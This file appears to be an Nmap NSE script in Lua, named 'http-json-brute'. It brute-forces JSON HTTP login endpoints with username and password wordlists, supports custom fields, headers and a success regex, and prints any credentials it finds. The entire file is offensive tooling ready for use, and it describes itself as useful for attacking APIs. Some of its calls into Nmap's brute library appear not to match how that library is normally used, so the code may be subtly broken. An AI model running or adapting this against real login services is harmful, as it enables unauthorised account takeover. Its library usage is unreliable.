local http = require "http"
local shortport = require "shortport"
local brute = require "brute"
local unpwdb = require "unpwdb"
local stdnse = require "stdnse"
local json = require "json"

description = [[
Performs brute-force login attempts against JSON-based HTTP or HTTPS login endpoints.

Supports custom paths, field names, headers, and success detection regex. 
Useful for attacking modern APIs and AJAX-based authentication services.
]]

---
-- @usage
-- nmap -p443 <target> --script http-json-brute --script-args \
--   http-json-brute.path="/api/login", \
--   http-json-brute.username_field="email", \
--   http-json-brute.password_field="password", \
--   http-json-brute.success_regex="token", \
--   http-json-brute.delay=1, \
--   http-json-brute.header.X-API-KEY="123abc", \
--   userdb=users.txt, passdb=rockyou.txt
--
-- @args http-json-brute.path Path to the login endpoint
-- @args http-json-brute.username_field Field name for username in JSON
-- @args http-json-brute.password_field Field name for password in JSON
-- @args http-json-brute.success_regex Regex to detect success in HTTP response
-- @args http-json-brute.delay Delay between attempts in seconds (optional)
-- @args http-json-brute.header.<key> Custom HTTP headers to include in request
-- @args userdb User list file
-- @args passdb Password list file
--
-- @output
-- PORT   STATE SERVICE
-- 443/tcp open  https
-- | http-json-brute:
-- |   Found credentials:
-- |     admin : admin123
-- |     user  : letmein
-- |_  Statistics: 120 attempts in 10 seconds

author = "Braxton Bailey"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"auth", "brute", "intrusive"}

portrule = function(host, port)
  return shortport.http(host, port) or shortport.ssl(host, port)
end

action = function(host, port)
  local path         = stdnse.get_script_args("http-json-brute.path") or "/api/login"
  local user_field   = stdnse.get_script_args("http-json-brute.username_field") or "username"
  local pass_field   = stdnse.get_script_args("http-json-brute.password_field") or "password"
  local success_regex = stdnse.get_script_args("http-json-brute.success_regex") or "token"
  local delay        = tonumber(stdnse.get_script_args("http-json-brute.delay")) or 0

  -- Build additional headers
  local headers = {
    ["Content-Type"] = "application/json",
    ["User-Agent"] = "Mozilla/5.0 (RedTeamNSE; BruteForce)"
  }

  for k,v in pairs(stdnse.get_script_args()) do
    local hk = k:match("^http%-json%-brute%.header%.(.+)")
    if hk then
      headers[hk] = v
    end
  end

  local creds = unpwdb.userpassword_iterator()
  if not creds then
    return "ERROR: Failed to load usernames or passwords."
  end

  local found = {}

  local engine = brute.Engine:new(
    host,
    port,
    function(username, password)
      stdnse.print_debug(1, "Trying %s:%s", username, password)

      local payload = {}
      payload[user_field] = username
      payload[pass_field] = password
      local body = json.encode(payload)

      local response = http.post(host, port, path, {
        header = headers,
        body = body
      })

      stdnse.sleep(delay)

      if response and response.status == 200 and response.body then
        if response.body:match(success_regex) then
          stdnse.print_debug(1, "Success regex [%s] matched", success_regex)
          local acct = brute.Account:new(username, password)
          table.insert(found, acct)
          stdnse.set_script_var("http-json-creds", {username, password})
          return true, acct
        end
      end

      return false
    end
  )

  engine:setMaxThreads(5)
  engine:set_credentials(creds)

  local result = engine:run()
  if #found > 0 then
    local out = "\n  Found credentials:\n"
    for _,acct in ipairs(found) do
      out = out .. string.format("    %s : %s\n", acct.username, acct.password)
    end
    return out
  else
    return result
  end
end

